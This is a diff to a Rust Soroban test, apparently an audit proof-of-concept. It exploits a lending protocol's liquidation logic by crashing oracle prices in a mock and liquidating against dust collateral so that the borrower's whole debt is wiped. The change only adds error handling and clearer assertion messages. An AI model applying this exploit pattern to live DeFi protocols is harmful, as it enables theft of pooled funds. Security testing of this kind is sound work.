@@ -30,35 +30,44 @@ fn test_aragui99_debt_wipeout() {
     
     let (pool, oracle, user, liq, asset_a, asset_b, asset_c) = abstract_protocol_setup(&env);
 
-    // Setup topology
-    pool.supply(&user, &asset_a, &10_000_000_000); // Massive collateral
-    pool.supply(&user, &asset_c, &2_000);          // Dust collateral
-    pool.borrow(&user, &asset_b, &7_400_000_000);  // Massive debt
+    // Setup topology — propagate errors instead of silently swallowing failures
+    pool.supply(&user, &asset_a, &10_000_000_000)
+        .expect("Failed to supply Asset A as collateral");
+    pool.supply(&user, &asset_c, &2_000)
+        .expect("Failed to supply dust Asset C as collateral");
+    pool.borrow(&user, &asset_b, &7_400_000_000)
+        .expect("Failed to borrow Asset B against collateral");
 
-    let init_data = pool.get_account_data(&user);
+    let init_data = pool.get_account_data(&user)
+        .expect("Failed to fetch initial account data");
     std::println!("[*] aragui99 - Init Debt: {} | Init HF: {}", init_data.total_debt, init_data.health_factor);
 
     // Force HF < 1.0
-    oracle.mock_price_drop(&asset_a, 85_000_000_000_000);
-    oracle.mock_price_pump(&asset_b, 115_000_000_000_000);
+    oracle.mock_price_drop(&asset_a, 85_000_000_000_000)
+        .expect("Failed to mock price drop for Asset A");
+    oracle.mock_price_pump(&asset_b, 115_000_000_000_000)
+        .expect("Failed to mock price pump for Asset B");
 
     // Exploit: Liquidate targeting dust
-    let liq_bal_before = asset_b.balance(&liq);
+    let liq_bal_before = asset_b.balance(&liq)
+        .expect("Failed to query liquidator balance before liquidation");
     
     let res = env.try_invoke_contract::<(), soroban_sdk::Error>(
         &pool.address, &Symbol::new(&env, "liquidate_position"),
         vec![&env, liq.into_val(&env), asset_c.into_val(&env), asset_b.into_val(&env), user.into_val(&env), (1_000_000_000u128).into_val(&env)]
     );
     
-    let liq_bal_after = asset_b.balance(&liq);
+    let liq_bal_after = asset_b.balance(&liq)
+        .expect("Failed to query liquidator balance after liquidation");
 
-    let final_data = pool.get_account_data(&user);
+    let final_data = pool.get_account_data(&user)
+        .expect("Failed to fetch post-liquidation account data");
     std::println!("[*] aragui99 - Remaining Collateral: {}", final_data.total_collateral);
     std::println!("[!] aragui99 - Liquidator Paid: {}", liq_bal_before - liq_bal_after);
     std::println!("[!] aragui99 - Post-Liquidation Debt: {}", final_data.total_debt);
 
-    assert!(res.is_ok(), "Liquidation failed");
-    assert_eq!(final_data.total_debt, 0, "Debt not wiped");
+    assert!(res.is_ok(), "Liquidation unexpectedly failed: {:?}", res.err());
+    assert_eq!(final_data.total_debt, 0, "Debt not wiped — expected 0, got {}", final_data.total_debt);
 }
 
 
